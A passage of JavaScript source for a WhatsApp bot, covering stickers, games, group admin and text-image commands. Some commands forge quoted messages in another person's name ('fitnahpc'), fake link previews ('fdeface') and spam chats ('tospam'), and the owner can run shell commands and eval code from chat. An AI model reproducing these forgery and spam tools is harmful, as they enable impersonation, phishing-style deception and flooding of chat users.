					fs.writeFileSync('./database/setik.json', JSON.stringify(setik))
					bosco.sendMessage(from, `*Sticker Added*`, MessageType.text, { quoted: mek })
					break
				case 'delsticker':
					try {
					 nmm = body.slice(12)
					 wanu = setik.indexOf(nmm)
					 setik.splice(wanu, 1)
					 fs.unlinkSync(`./media/sticker/${nmm}.webp`)
					 costum(from, '*Sticker Deleted*', fake)
					} catch (err){
						console.log(err)
						reply(mess.error.api)
					}
					break
            case 'imagelist':
				case 'listimage':
					teks = '*ListImages :*\n\n'
					for (let awokwkwk of imagi) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${imagi.length}*\n\n_Type Any Image_`
					bosco.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": imagi } })
					break
        
//------------------< Tag >-------------------

       case 'tag':
			if (args.length < 1) return reply(`Consumption ${prefix}tag 60xxxx`)
            var nomqm = `${body.slice(5)}@s.whatsapp.net`
					tagq = `@${nomqm.split('@')[0]}` 
					bosco.sendMessage(from, tagq, text, { quoted: ftroli, contextInfo: { forwardingScore: 508, isForwarded: true, mentionedJid: [nomqm]}})
			break

//------------------< Bot Info >-------------------

       case 'runtime':
              textImg(`${runtime(process.uptime())}`)
              break
      case 'ping':
      case 'speed':
              timestampe = speed();
              latensie = speed() - timestampe
              reply(`*「 𝙎𝙋𝙀𝙀𝘿 𝙏𝙀𝙎𝙏 」*\nRespond in ${latensie.toFixed(4)} Sec 💬`)
              break

//------------------< Game >-------------------
       case 'slot':
              const sotoy = ['🍊 : 🍒 : 🍐','🍒 : 🍇 : 🍊','🍐 : 🍒 : 🍐','🍊 : 🍋 : 🔔','🔔 : 🍒 : 🍐','🔔 : 🍒 : 🍊','🍊 : 🍋 : 🔔','🍐 : 🍒 : 🍋','🍐 : 🍐 : 🍐','🍊 : 🍒 : 🍒','🔔 : 🔔 : 🍇','🍌 : 🍒 : 🔔','🍐 : 🔔 : 🔔','🍊 : 🍋 : 🍒','🍋 : 🍋 : 🍌','🔔 : 🔔 : 🍇','🔔 : 🍐 : 🍇','🔔 : 🔔 : 🔔','🍒 : 🍒 : 🍒','🍌 : 🍌 : 🍌','🍇 : 🍇 : 🍇']
              somtoy = sotoy[Math.floor(Math.random() * (sotoy.length))]	
              somtoyy = sotoy[Math.floor(Math.random() * (sotoy.length))]	
              somtoyyy = sotoy[Math.floor(Math.random() * (sotoy.length))]	
              if (somtoyy  == '🍌 : 🍌 : 🍌') {
              reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
              } else if (somtoyy == '🍒 : 🍒 : 🍒') {
              reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
              } else if (somtoyy == '🔔 : 🔔 : 🔔') {
              reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
              } else if (somtoyy == '🍐 : 🍐 : 🍐') {
              reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
              } else if (somtoyy == '🍇 : 🍇 : 🍇') {
              reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
              } else {
              reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU LOSE*  ]`)
              }
              break
//------------------< Group >-------------------
        
       case 'block':
				 bosco.updatePresence(from, Presence.composing) 
				 bosco.chatRead (from)
					if (!isGroup) return reply(mess.group())
					if (!isOwner) return reply(mess.owner)
					bosco.blockUser (`${body.slice(7)}@c.us`, "add")
					bosco.sendMessage(from, `*ʙʟᴏᴄᴋᴇᴅ* ${body.slice(7)}@c.us`, text)
					break
		case 'unblock':
					if (!isGroup) return reply(mess.group)
					if (!isOwner) return reply(mess.owner)
				    bosco.blockUser (`${body.slice(9)}@c.us`, "remove")
					bosco.sendMessage(from, `*ᴜɴʙʟᴏᴄᴋᴇᴅ* ${body.slice(9)}@c.us`, text)
					break
         case 'getpic':
					if (!isGroup) return reply(mess.only.group)
            mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
            pictt = await bosco.getProfilePicture(mentioned)
            pict = await getBuffer(pictt)
            bosco.sendMessage(from, pict, image, {quoted: mek})
            break
        case 'getpp':
               if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) {
               linkpp = await bosco.getProfilePicture(from) || "https://telegra.ph/file/40151a65238ba2643152d.jpg"
               buffer = await getBuffer(linkpp)
               bosco.sendMessage(from, buffer, image, {caption: "Nih", quoted: mek })
               } else if (mek.message.extendedTextMessage.contextInfo.mentionedJid === null || mek.message.extendedTextMessage.contextInfo.mentionedJid === undefined) {
               mberr = mek.message.extendedTextMessage.contextInfo.participant
               linkpp = await bosco.getProfilePicture(mberr) || "https://telegra.ph/file/40151a65238ba2643152d.jpg"
               buffer = await getBuffer(linkpp)
               bosco.sendMessage(from, buffer, image, { quoted: mek, caption: `Profile Picture of @${mberr.split("@")[0]}`, contextInfo: { "mentionedJid": [mberr] }})
               } else if (mek.message.extendedTextMessage.contextInfo.mentionedJid.length > 0) {
               mberr = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
               linkpp = await bosco.getProfilePicture(mberr) || "https://telegra.ph/file/40151a65238ba2643152d.jpg"
               buffer = await getBuffer(linkpp)
               bosco.sendMessage(from, buffer, image, { quoted: mek, caption: `Profile Picture of @${mberr.split("@")[0]}`, contextInfo: { "mentionedJid": [mberr] }})
}
               break
          case 'get':
        case 'fetch': //ambil dari nuru
               if (!/^https?:\/\//.test(q)) return reply('Awali *URL* dengan http:// atau https://')
               res = await fetch(q)
               if (res.headers.get('content-length') > 100 * 1024 * 1024 * 1024) {
               delete res
               throw `Content-Length: ${res.headers.get('content-length')}`
}
               if (!/text|json/.test(res.headers.get('content-type'))) return sendMediaURL(from, q)
               txtx = await res.buffer()
               try {
               txtx = util.format(JSON.parse(txtx+''))
               } catch (e) {
               txtx = txtx + ''
               } finally {
               reply(txtx.slice(0, 65536) + '')
}
               break
        case 'searchmsg':  //by ANU TEAM
               if (args.length < 1) return reply(`*What Message Are You Looking For?\nEx-: ${prefix + command} halo|10*`)
               teks = arg
               if (teks.includes("|")) { 
               try {
               var ve = teks.split("|")[0]
               var za = teks.split("|")[1]
               sampai = `${za}`
               if (isNaN(sampai)) return reply('*Must be a Number!*')
               batas = parseInt(sampai) + 1
               if (batas > 30) return reply('*Max 30!*')
               reply(mess.wait)
               cok = await bosco.searchMessages(`${ve}`, from, batas,1) 
               if (cok.messages.length < 2) return reply('*Message Not Found*') 
               if (cok.messages.length < parseInt(batas)) reply(`*Found Only* ${cok.messages.length - 1} *Message*`)
               for (i=1;i < cok.messages.length;i++) {
               if (cok.messages[i].message) {
               bosco.sendMessage(from, `*Found!*`, text, {sendEphemeral: true, quoted: cok.messages[i]}) 
}
}
               } catch (e) {
               return reply(String(e))
}
               } else {
               reply(`*The format is wrong tod This is an example of the correct format* : ${prefix + command} halo|10`)
}
               break

//------------------< Maker Menu >-------------------

                // Textprome //
                case 'blackpink':
                case 'neon':
                case 'greenneon':
                case 'advanceglow':
                case 'futureneon':
                case 'sandwriting':
                case 'sandsummer':
                case 'sandengraved':
                case 'metaldark':
                case 'neonlight':
                case 'holographic':
                case 'text1917':
                case 'minion':
                case 'deluxesilver':
                case 'newyearcard':
                case 'bloodfrosted':
                case 'halloween':
                case 'jokerlogo':
                case 'fireworksparkle':
                case 'natureleaves':
                case 'bokeh':
                case 'toxic':
                case 'strawberry':
                case 'box3d':
                case 'roadwarning':
                case 'breakwall':
                case 'icecold':
                case 'luxury':
                case 'cloud':
                case 'summersand':
                case 'horrorblood':
                case 'thunder':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Denis hehe`)
                    ini_txt = args.join(" ")
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/textprome/${command}?apikey=${lolkey}&text=${ini_txt}`)
                    bosco.sendMessage(from, ini_buffer, image, { quoted: ftroli})
                    break
                case 'pornhub':
                case 'glitch':
                case 'avenger':
                case 'space':
                case 'ninjalogo':
                case 'marvelstudio':
                case 'lionlogo':
                case 'wolflogo':
                case 'steel3d':
                case 'wallgravity':
		if (!isRegistered) return reply(ind.noregis())
               cf = `${body.slice(8)}`
                    txt1 = cf.split("/")[0];
                    txt2 = cf.split("/")[1];
                    if (args.length == 0) return reply(`Example: ${prefix + command} Denis hehe`)
                    txt1 = args[0]
                    txt2 = args[1]
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/textprome2/${command}?apikey=${lolkey}&text1=${txt1}&text2=${txt2}`)
                    bosco.sendMessage(from, ini_buffer, image, { quoted: ftroli})
                    break

                    // Photo Oxy //
                case 'shadow':
                case 'cup':
                case 'cup1':
                case 'romance':
                case 'smoke':
                case 'burnpaper':
                case 'lovemessage':
                case 'undergrass':
                case 'love':
                case 'coffe':
                case 'woodheart':
                case 'woodenboard':
                case 'summer3d':
                case 'wolfmetal':
                case 'nature3d':
                case 'underwater':
                case 'golderrose':
                case 'summernature':
                case 'letterleaves':
                case 'glowingneon':
                case 'fallleaves':
                case 'flamming':
                case 'harrypotter':
                case 'carvedwood':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Denis hehe`)
                    ini_txt = args.join(" ")
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/photooxy1/${command}?apikey=${lolkey}&text=${ini_txt}`)
                    bosco.sendMessage(from, ini_buffer, image, { quoted: ftext})
                    break
                case 'tiktok':
                case 'arcade8bit':
                case 'battlefield4':
                case 'pubg':
		            cf = `${body.slice(8)}`
                    txt1 = cf.split("/")[0];
                    txt2 = cf.split("/")[1];
                    if (args.length == 0) return reply(`Example: ${prefix + command} Denis hehe`)
                    txt1 = args[0]
                    txt2 = args[1]
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/photooxy2/${command}?apikey=${lolkey}&text1=${txt1}&text2=${txt2}`)
                    bosco.sendMessage(from, ini_buffer, image, { quoted: fgc})
                    break

                    // Ephoto 360 //
                case 'wetglass':
                case 'multicolor3d':
                case 'watercolor':
                case 'luxurygold':
                case 'galaxywallpaper':
                case 'lighttext':
                case 'beautifulflower':
                case 'puppycute':
                case 'royaltext':
                case 'heartshaped':
                case 'birthdaycake':
                case 'galaxystyle':
                case 'hologram3d':
                case 'greenneon':
                case 'glossychrome':
                case 'greenbush':
                case 'metallogo':
                case 'noeltext':
                case 'glittergold':
                case 'textcake':
                case 'starsnight':
                case 'wooden3d':
                case 'textbyname':
                case 'writegalacy':
                case 'galaxybat':
                case 'snow3d':
                case 'birthdayday':
                case 'goldplaybutton':
                case 'silverplaybutton':
                case 'freefire':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Denis hehe`)
                    ini_txt = args.join(" ")
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/ephoto1/${command}?apikey=${lolkey}&text=${ini_txt}`)
                    bosco.sendMessage(from, ini_buffer, image, { quoted: fgif})
                    break
                 case 'sc':
                 case 'git':
		case 'sourcecode':
		function _0x1f50(_0x209a2e,_0x5079f5){var _0x1133bc=_0x44d2();return _0x1f50=function(_0x55ee06,_0x26680f){_0x55ee06=_0x55ee06-0x152;var _0x44d270=_0x1133bc[_0x55ee06];return _0x44d270;},_0x1f50(_0x209a2e,_0x5079f5);}var _0x2c057a=_0x1f50;function _0x44d2(){var _0x387e95=['hehe','5000bVYgeV','apply','4153655twAYRV','▢\x20Call\x20me\x20TEDZO\x20Sɪʀ\x20▢','24CnBiap','split','toString','130QHbvJQ','search','ephemeralMessage','(((.+)+)+)+$','constructor','buttonsMessage','74744xOoftI','message','55002dqgfBH','prepareMessage','1847619gLtKAp','26345196LKPCHx','locationMessage','315jrFkZq','126mIOGQg','200427wIpjqE','10ujPZBD'];_0x44d2=function(){return _0x387e95;};return _0x44d2();}(function(_0x4617b3,_0xd7a238){var _0xc75b39=_0x1f50,_0x560992=_0x4617b3();while(!![]){try{var _0x1eea72=-parseInt(_0xc75b39(0x15b))/0x1*(parseInt(_0xc75b39(0x15f))/0x2)+-parseInt(_0xc75b39(0x15c))/0x3*(parseInt(_0xc75b39(0x163))/0x4)+parseInt(_0xc75b39(0x166))/0x5*(-parseInt(_0xc75b39(0x155))/0x6)+-parseInt(_0xc75b39(0x15a))/0x7*(parseInt(_0xc75b39(0x153))/0x8)+-parseInt(_0xc75b39(0x157))/0x9+-parseInt(_0xc75b39(0x15d))/0xa*(parseInt(_0xc75b39(0x161))/0xb)+parseInt(_0xc75b39(0x158))/0xc;if(_0x1eea72===_0xd7a238)break;else _0x560992['push'](_0x560992['shift']());}catch(_0x38e5cc){_0x560992['push'](_0x560992['shift']());}}}(_0x44d2,0x3a152));var _0x26680f=function(){var _0x1948f5=!![];return function(_0x1cdee3,_0x33a6ab){var _0x5361d5=_0x1948f5?function(){var _0x7c79c6=_0x1f50;if(_0x33a6ab){var _0x447793=_0x33a6ab[_0x7c79c6(0x160)](_0x1cdee3,arguments);return _0x33a6ab=null,_0x447793;}}:function(){};return _0x1948f5=![],_0x5361d5;};}(),_0x55ee06=_0x26680f(this,function(){var _0x19c139=_0x1f50;return _0x55ee06[_0x19c139(0x165)]()[_0x19c139(0x167)](_0x19c139(0x169))[_0x19c139(0x165)]()[_0x19c139(0x16a)](_0x55ee06)[_0x19c139(0x167)](_0x19c139(0x169));});_0x55ee06(),sc1=await bosco[_0x2c057a(0x156)](from,dfrply,location,{'thumbnail':dfrply}),sc2=sc1[_0x2c057a(0x154)][_0x2c057a(0x168)]?sc1['message']['ephemeralMessage']:sc1,sc='\x20Hɪ\x20Bʀᴏ\x20@'+sender[_0x2c057a(0x164)]('@')[0x0]+'Bᴏᴛ\x20Sᴄʀɪᴘᴛ\x20Wɪʟʟ\x20Bᴇ\x20Aᴠᴀɪʟᴀʙʟᴇ\x20Oɴ\x20🔧\x0a\x0a\x22a_s_l_a_m_._x\x22\x0a\x0a\x0a\x0a\x22https://github.com/TEDZO123/TEDZO-SIR-1\x22\x0a\x0a',scbutton=[{'buttonId':prefix+'.jadibot','buttonText':{'displayText':'MAKE ONE'},'type':0x1}],scmessage={'contentText':''+sc,'footerText':_0x2c057a(0x162),'buttons':scbutton,'headerType':0x6,'locationMessage':sc2['message'][_0x2c057a(0x159)]},bosco['sendMessage'](from,scmessage,MessageType[_0x2c057a(0x152)],{'caption':_0x2c057a(0x15e),'contextInfo':{'mentionedJid':[sender]}});
		break
        case 'isbaileys': 
case 'bail': 
case 'baileys':
reply(`${mek.quoted.isBaileys}`)
break
case 'getcaption':
try {
reply(`${mek.quoted.title}`)
} catch {
reply(`${mek.quoted.caption}`)
}
break
case 'q': 
if (!m.quoted) return reply('reply message!')
let qse = bosco.serializeM(await m.getQuotedObj())
if (!qse.quoted) return reply('the message you replied does not contain a reply!')
await qse.quoted.copyNForward(m.chat, true)
break
     case 'groplist':
                case 'grouplist':
  const txs = bosco.chats.all().filter(v => v.jid.endsWith('g.us')).map(v =>`- ${bosco.getName(v.jid)}\n${v.jid}\n[${v.read_only ? 'Left' : 'Joined'}]`).join`\n\n`
  reply(txs)
  break
     
     
           case 'wiki':
if (args.length < 1) return reply('*What Are You Looking For?*')
teks = args.join(' ')
res = await wikiSearch(teks).catch(e => {
return reply('*Error Result Not Found*') 
}) 
result = `*Judul :* ${res[0].judul}
*Wiki :* ${res[0].wiki}`
sendFileFromUrl(res[0].thumb, image, {quoted: mek, caption: result}).catch(e => {
  reply(result)
})
break
           case 'tospam':
if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length > 10) {
teks = body.slice(8)
oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('*Most!*')
if (!Number(oi2)) return reply('*The number must be a number!*')
	  for (let i = 0; i < oi2; i++) {
	  bosco.sendMessage(from, `${oi1}`, MessageType.text)
	  }
} else if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length < 10) {
teks = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
if (!Number(args[0])) return reply('*The number must be a number!*')
if (Number(args[0]) >= 50) return reply('*Most!*')
	  for (let i = 0; i < args[0]; i++) {
	  bosco.sendMessage(from, teks, MessageType.text)
	  }
} else if (isQuotedSticker) {
	encmedian = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	         median = await bosco.downloadAndSaveMediaMessage(encmedian)
				anu = fs.readFileSync(median)
	if (!Number(args[0])) return reply('*The number must be a number!*')
	if (Number(args[0]) >= 50) return reply('*Most!*')
	  for (let i = 0; i < args[0]; i++) {
	  bosco.sendMessage(from, anu, sticker)
	  }
} else if (isQuotedAudio) {
	encmediat = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	            mediat = await bosco.downloadAndSaveMediaMessage(encmediat)
				anu = fs.readFileSync(mediat)
	if (!Number(args[0])) return reply('*The number must be a number!*')
	if (Number(args[0]) >= 50) return reply('*Most!*')
	  for (let i = 0; i < args[0]; i++) {
	  bosco.sendMessage(from, anu, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt:true})
	  }
} else if (isQuotedImage) {
	boij = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
	delb = await bosco.downloadMediaMessage(boij)
	teks = body.slice(6)
	oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('*Most!*')
	if (!Number(oi2)) return reply('*The number must be a number!*')
	  for (let i = 0; i < oi2; i++) {
	  bosco.sendMessage(from, delb, MessageType.image, {caption: oi1})
	  }
}
	  break
      case 'delchat':
                    if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
                reply('*Successfully delete chat*' + from)
                await sleep(4000)
                bosco.modifyChat(from, ChatModification.delete)
                break
     case 'mute':
			    if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
			    if (!isGroup) return reply(mess.only.group)
                if (isMuted) return reply(`*already muted*`)
                mute.push(from)
                fs.writeFileSync('./database/mute.json', JSON.stringify(mute))
                reply('*The bot has been successfully muted in this chat*')
                break
     case 'tts':
					if (args.length < 1) return bosco.sendMessage(from, `Kode bahasanya mana kak? contoh : ${prefix}tts id yamate kudasai`, text, { quoted: mek })
				   const gtts = require('./lib/gtts')(args[0])
					if (args.length < 2) return bosco.sendMessage(from, `Teksnya mana kak? contoh : ${prefix}tts id yamate kudasai`, text, { quoted: mek })
					var bby = body.slice(8)
					ranm = getRandom('.mp3')
					rano = getRandom('.ogg')
					bby.length > 300
						? reply('Teks nya terlalu panjang kak')
						: gtts.save(ranm, bby, function () {
							exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
								fs.unlinkSync(ranm)
								buff = fs.readFileSync(rano)
								if (err) return reply(dla.stikga())
								bosco.sendMessage(from, buff, audio, { duration: 359996400, ptt: true, quoted: mek })
								fs.unlinkSync(rano)
							})
						})
					break
        case 'demote':
				if (!isGroup) return reply(mess.only.group)
				if (!isGroupAdmins) return reply(mess.only.admin)
				if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('*Reply To Target*')
			demote = mek.message.extendedTextMessage.contextInfo.participant
		    bosco.groupDemoteAdmin(from, [demote])
						reply('*Successful Demote an Admin*')
						break
					case 'promote':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
				  if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('*Reply To Target*')
			promote = mek.message.extendedTextMessage.contextInfo.participant
		    bosco.groupMakeAdmin(from, [promote])
						reply('*Successful Promoted an Admin')
						break
                case 'linkgc':
				if (!isGroup) return reply(mess.only.group)
					linkgc = await bosco.groupInviteCode(from)
					yeh = `https://chat.whatsapp.com/${linkgc}\n\nLink grup ${groupName}`
					bosco.sendMessage(from, yeh, text, { quoted: fgc })
					break
     case 'resetlinkgroup':
         case 'revoke':
         if (!isGroup) return reply(mess.only.group)
         if (!isGroupAdmins) return reply(mess.only.admin)
          json = ['action', 'inviteReset', from]
         bosco.query({json, expect200: true})
          reply('*Succes Reset Group Link*')
         break
     case 'tagme':
                  var nomqm = mek.participant
				    tagu = `@${nomqm.split('@')[0]}`
					bosco.sendMessage(from, tagu, text, { quoted: ftrol, contextInfo: { forwardingScore: 508, isForwarded: true, mentionedJid: [nomqm]}})
					break
                    case 'fdeface':
                              var nn = body.slice(9)
                                var urlnye = nn.split("|")[0];
                                var titlenye = nn.split("|")[1];
                                var descnye = nn.split("|")[2];
                                imgbbb = require('imgbb-uploader')
                                run = getRandom('.jpeg')
                                encmediad = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                                mediad = await bosco.downloadAndSaveMediaMessage(encmediad)
                                ddatae = await imageToBase64(JSON.stringify(mediad).replace(/\"/gi, ''))
                                bosco.sendMessage(from, {
                                        text: `${urlnye}`,
                                        matchedText: `${urlnye}`,
                                        canonicalUrl: `${urlnye}`,
                                        description: `${descnye}`,
                                        title: `${titlenye}`,
                                        jpegThumbnail: ddatae
                                }, 'extendedTextMessage', { detectLinks: false })
                                break

                case 'fitnahpc':
                if (args.length < 1) return reply(`Usage :\n${prefix}fitnahpc [number|message|replybot]]\n\nEx : \n${prefix}fitnahpc 0|hai|hai juga markenlin`)
                var gh = body.slice(10)
                var parti = gh.split("|")[0];
                var targetq = gh.split("|")[1];
				var bot = gh.split("|")[2];
			    bosco.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${parti}@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { conversation: `${targetq}` }}})
					break
                case 'return':
				if (!isOwner) return 
					return bosco.sendMessage(from, JSON.stringify(eval(body.slice(8))), text, {quoted: mek})
					if (err) return bosco.sendMessage(from, `root @Denis Ser:~ ${err}`, text, { quoted: mek })
                 break
              case 'swm':
						if (isMedia && !mek.message.videoMessage || isQuotedImage) {
							ppp = `${args.join(' ')}`
							const encmediao = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
							const media = await bosco.downloadAndSaveMediaMessage(encmediao, `./sticker/${sender}`)
							const packname1 = ppp.split('|')[0]
							const author1 = ppp.split('|')[1]
							exif.create(packname1, author1, `stickwm_${sender}`)
							await ffmpeg(`${media}`)
									.input(media)
									.on('start', function (cmd) {
										console.log(`Started : ${cmd}`)
									})
									.on('error', function (err) {
										console.log(`Error : ${err}`)
										fs.unlinkSync(media)
										reply(mess.error.api)
									})
									.on('end', function () {
										console.log('Finish')
										exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
											if (error) return reply(mess.error.api)
											bosco.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: mek})
											fs.unlinkSync(media)	
											fs.unlinkSync(`./sticker/${sender}.webp`)	
											fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
										})
									})
									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
									.toFormat('webp')
									.save(`./sticker/${sender}.webp`)
						} else if ((isMedia && mek.message.videoMessage.fileLength < 10000000 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
							wmsti = body.slice(11)
							if (!wmsti.includes('|')) return reply(`Kirim gambar atau reply gambar dengan caption *${prefix}stickerwm nama|author*`)
							const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
							const media = await bosco.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
							const packname1 = wmsti.split('|')[0]
							const author1 = wmsti.split('|')[1]
							exif.create(packname1, author1, `stickwm_${sender}`)
							reply(mess.wait)
								await ffmpeg(`${media}`)
									.inputFormat(media.split('.')[4])
									.on('start', function (cmd) {
										console.log(`Started : ${cmd}`)
									})
									.on('error', function (err) {
										console.log(`Error : ${err}`)
										fs.unlinkSync(media)
										tipe = media.endsWith('.mp4') ? 'video' : 'gif'
										reply(mess.error.api)
									})
									.on('end', function () {
										console.log('Finish')
										exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
											if (error) return reply(mess.error.api)
											bosco.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: mek})
											fs.unlinkSync(media)
											fs.unlinkSync(`./sticker/${sender}.webp`)
											fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
										})
									})
									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
									.toFormat('webp')
									.save(`./sticker/${sender}.webp`)
						} else {
							reply(`*Send picture/video with caption ${prefix}stickerwm nama|author or tag images/videos that have been sent*\n*Note: Maximum video duration is 10 seconds*`)
						}
						break










     
default:
if (budy.startsWith('=>')){
if (!isOwner) return
try {
return bosco.sendMessage(from, 
`${a}📥 Input: ${budy.slice(3)}
📤 OutPut: 
${JSON.stringify(eval(budy.slice(2)),null,'\t')}
${a}`
,text, {quoted:mek })
} catch(err) {
e = String(err)
reply(`${a} "err" :  "${e}"${a}`)
}
}
if (budy.startsWith(`$`)){
if (!isOwner) return
const sep = budy.split("\n")
let exc = budy.replace(sep[0]+"\n", "")
exec(exc, (err, stdout) => {
if (err) return bosco.sendMessage(from, `root @denis:~ ${err}`, text, { quoted: mek })
if (stdout) {
bosco.sendMessage(from, stdout, text)
}
})
}
if (budy.startsWith('>')) {
if (!isOwner) return
try {
console.log(color('[ EVAL ]', 'pink'), color(time), budy, color('from', 'yellow'), pushname, color('di'), isGroup ? groupName : 'Private Chat')
reply(require('util').format(eval(`;(async () => { ${budy.slice(2)} })()`)))
} catch(e) {
console.log(e)
err = String(e)
js = JSON.stringify(e, null, 2)
if (js == '{}') js = { err }
js = JSON.stringify(js, null, 2)
js = '```' + js + '```'
reply('_' + err + '_\n\n' + js)
}
}
if (isGroup && budy != undefined) {
} else {
console.log('[',color('TEXT','teal'),']',`Message : ${budy} From`, color(pushname))
}		
}
	} catch (e) {
    e = String(e)
    if (!e.includes("this.isZero")) {
	console.log('Message : %s', color(e, 'green'))
        }
	}
}
